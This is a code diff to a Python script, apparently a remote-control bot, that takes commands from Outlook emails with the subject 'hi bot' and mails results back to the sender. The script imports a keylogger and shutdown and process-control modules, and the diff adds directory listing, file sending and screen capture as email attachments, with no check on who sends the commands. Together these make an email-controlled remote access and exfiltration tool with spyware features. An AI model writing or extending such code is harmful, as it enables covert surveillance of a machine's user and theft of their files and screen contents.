@@ -4,27 +4,33 @@ import keylogger_server
 import shutdown_logout_server
 import win32com.client
 import app_process_server
-
+import directory_tree_server
+import live_screen_server
 outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
 islock = 0
+havePath = 0
 machineState = 1
 
 listName = list()
 listPid = list()
 listProcess = list()
 
-def sendBack(subject,body,sendTo):
+def utilPath(rep):
+    return rep.split("\n")[-1]
+
+def sendBack(subject,body,sendTo,path):
     repMailItem = win32com.client.Dispatch("Outlook.Application").CreateItem(0)
     repMailItem.Subject = subject
     repMailItem.BodyFormat = 1
     repMailItem.Body = body
     repMailItem.To = sendTo
-
+    if path:
+        repMailItem.Attachments.Add(path)
     repMailItem.Display()
     repMailItem.Send()
 
 def listen(msg):
-    global islock,machineState,listName,listPid,listProcess
+    global islock,machineState,listName,listPid,listProcess,havePath
     string = msg.lower().strip().split()
     rep = ""
     if "mapi" == string[0]:
@@ -59,7 +65,18 @@ def listen(msg):
                 rep = app_process_server.app_process(msg)
             if "start" == string[2]:
                 rep = app_process_server.app_process(msg)
-    return msg + "\nREP:\n"+ rep
+        if "file" == string[1]:
+            if "list" == string[2]:
+                rep = directory_tree_server.getTree(msg)
+            if "send" == string[2]:
+                havePath = 1
+                rep = directory_tree_server.getPathFile(msg)
+        if "screen" == string[1]:
+            if "scap" == string[2]:
+                havePath = 1
+                rep = live_screen_server.capture_screenNow()
+
+    return msg + "\nREP:\n" + rep
 
 inbox = outlook.GetDefaultFolder(6)
 messages = inbox.Items
@@ -71,7 +88,10 @@ while True:
         if( "hi bot" in mailNow.subject.lower()):
             rep = listen(mailNow.Body)
             print(rep)
-            sendBack("I'm bot",rep,mailNow.Sender.GetExchangeUser().PrimarySmtpAddress)
+            if havePath == 1:
+                sendBack("I'm bot",rep,mailNow.Sender.GetExchangeUser().PrimarySmtpAddress,path=utilPath(rep))
+            else:
+                sendBack("I'm bot", rep, mailNow.Sender.GetExchangeUser().PrimarySmtpAddress,path="")
             mailDefault = mailNow
             print(True)
 
@@ -81,7 +101,7 @@ while True:
             shutdown_logout_server.shutdown_logout("logout")
     else:
         print(False)
-
+    havePath = 0
     #print(mailDefault.Sendername)
     #print(mailDefault.subject)
     #print(mailDefault.Body)
